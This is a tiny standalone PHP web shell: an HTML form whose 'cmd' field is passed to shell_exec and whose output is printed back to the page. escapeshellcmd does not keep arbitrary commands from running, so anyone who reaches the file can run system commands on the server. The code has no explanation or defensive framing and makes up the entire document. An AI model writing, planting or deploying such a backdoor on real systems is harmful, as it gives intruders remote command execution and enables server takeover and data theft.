<form method="POST">
<input name="cmd"><input type="submit">
</form>
<?php
if($_POST['cmd']) echo "<pre>" . htmlspecialchars(shell_exec(escapeshellcmd($_POST['cmd']))) . "</pre>";
?>
